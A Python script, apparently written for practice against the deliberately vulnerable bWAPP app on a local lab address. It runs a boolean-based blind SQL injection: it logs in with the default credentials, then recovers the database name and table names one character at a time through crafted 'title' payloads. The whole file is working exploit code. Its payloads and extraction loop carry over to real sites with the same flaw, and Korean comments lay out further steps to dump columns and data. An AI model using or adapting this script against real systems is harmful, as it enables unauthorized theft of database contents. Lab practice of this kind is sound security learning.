#!/usr/bin/py
#-*-coding:utf-8 -*-

import requests

def GetTables(urlTarget, cookies, databaseName):
  tables = []
  tempTable = ""
  cntTables = 0
  checkEof = 0

  while(True):
    for i in range(1, 66): ## Maximum length of table's name
      if (i == 2 and tempTable == ""):
        return tables, cntTables
      
      if (checkEof == 1):
        checkEof = 0
        break

      for j in range(32, 128): ## Ascii code
        try:
          paramsTarget = {
            "title": "' or 1 and substr((select table_name from information_schema.tables where table_schema=\"" + databaseName + "\" limit "+ str(cntTables) + ", 1), " + str(i) + ", 1)=binary(\"" + chr(j) + "\")#",
            "action": "search"
          }

          r = requests.get(urlTarget, params=paramsTarget, cookies=cookies)
          #print(j)
        
        except Exception as e:
          print(e)
          print("Error...")
          j = j - 1;
          continue;
          exit(1)

        if 'The movie exists in our database!' in r.text:
          tempTable += chr(j)
          
          break
        
        if (j == 127):
          checkEof = 1
    
    tables.append(tempTable)
    tempTable = ""
    cntTables += 1

def GetDatabaseName(urlTarget, cookies, lengthOfDatabaseName):
  databaseName = ""
  
  for i in range(1, lengthOfDatabaseName + 1):
    for j in range(32, 128):
      try:
        paramsTarget = {
          "title": "' or 1 and substr(database(), " + str(i) + ", 1)=binary('" + chr(j) + "')#",
          "action": 'search"'
        }

        r = requests.get(urlTarget, params=paramsTarget, cookies=cookies)
      
      except Exception as e:
        print(e)
        print("Error...")
        exit(1)
      
      if 'The movie exists in our database!' in r.text:
        databaseName += chr(j)
        break
  
  return databaseName

def GetLengthOfDatabaseName(urlTarget, cookies):
  for i in range(1, 21):
    try:
      paramsTarget = {
        "title": "' or 1 and length(database())=" + str(i) + "#",
        "action": "search"
      }
      
      r = requests.get(urlTarget, params=paramsTarget, cookies=cookies)

    except Exception as e:
      print("Error...")
      print(e)
      continue
    
    if 'The movie exists in our database!' in r.text:
      return i

def GetCookies(urlLogin, paramsLogin):
  try:
    session = requests.session()
    session.post(urlLogin, data=paramsLogin)
    
    return session.cookies.get_dict()

  except Exception as e:
    print(e)
    print("Error...")
    exit(1)

if __name__=="__main__":
  urlLogin = "http://192.168.91.135/bWAPP/login.php"
  urlTarget = "http://192.168.91.135/bWAPP/sqli_4.php"
  paramsLogin = {
    "login": "bee",
    "password": "bug",
    "security_level": "0",
    "form": "submit"
  }

  cookies = GetCookies(urlLogin, paramsLogin)
  print("## cookies ##")
  print(cookies)
  print("")

  lengthOfDatabaseName = GetLengthOfDatabaseName(urlTarget, cookies)
  print("## length of database ##")
  print(lengthOfDatabaseName)
  print("")

  databaseName = GetDatabaseName(urlTarget, cookies, lengthOfDatabaseName)
  print("## name of database ##")
  print(databaseName)
  print("")

  print("Search for a table. It takes a long time if there are a lot of tables.\n")
  tables, cntTables = GetTables(urlTarget, cookies, databaseName)
  print("## " + databaseName + "'s tables ##")
  print(tables)
  print("")

  print("## " + databaseName + "'s table count ##")
  print(str(cntTables) + "개")
  print("")

  if (cntTables != 0):
    print(1)
    # 1. 컬럼 개수 파악
    # 2. 컬럼명 파악
    # 3. 컬럼별 데이터 파악
  
